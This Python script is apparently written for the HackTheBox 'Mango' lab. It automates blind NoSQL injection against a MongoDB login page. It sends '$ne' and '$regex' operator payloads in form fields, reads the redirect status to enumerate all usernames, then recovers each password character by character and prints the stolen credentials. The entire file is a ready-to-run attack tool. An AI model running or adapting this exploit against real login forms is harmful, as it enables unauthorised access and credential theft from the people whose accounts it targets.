import requests
import string
import re

# Target details
URL = 'http://staging-order.mango.htb/'
# Includes all printable characters to ensure we catch every possible username/password
CHARSET = string.printable.strip()

def check_payload(data):
    """Sends the POST request and returns True if successful."""
    payload = {**data, 'login': 'login', 'password[$ne]': 'admin'}
    try:
        res = requests.post(URL, data=payload, allow_redirects=False)
        return res.status_code == 302
    except requests.exceptions.RequestException:
        return False

def discover_users():
    """Enumerates all existing usernames from the database."""
    print("[*] Enumerating usernames...")
    usernames = []
    # Brute-force discovery of usernames
    # We look for any string that exists as a username
    # This is a basic approach: refine as needed for performance
    
    # Example: discovery via prefix brute-force
    def search_users(prefix=""):
        for char in CHARSET:
            # Escape for regex safety
            test_val = prefix + char
            if check_payload({'username[$regex]': f'^{re.escape(test_val)}.*'}):
                # If we find a full match, record it
                if check_payload({'username': test_val}):
                    if test_val not in usernames:
                        print(f"[!] Found user: {test_val}")
                        usernames.append(test_val)
                # Keep branching to find longer usernames
                search_users(test_val)
                
    search_users()
    return list(set(usernames))

def extract_password(user):
    """Extracts password for a discovered user."""
    password = ""
    while True:
        found_char = False
        for char in CHARSET:
            regex = f"^{re.escape(password + char)}.*"
            if check_payload({'username': user, 'password[$regex]': regex}):
                password += char
                print(f"[+] Found char: {char} | Current pass: {password}")
                found_char = True
                break
        if not found_char:
            break
    return password

if __name__ == '__main__':
    print("[*] Launching the blind Mongo SQLi")
    
    # Discovery phase
    targets = discover_users()
    
    # Extraction phase
    for user in targets:
        print(f"\n[*] Targeting: {user}")
        password = extract_password(user)
        print(f"[!!!] COMPROMISED: {user} : {password}")

    print("\n[*] All targets compromised.")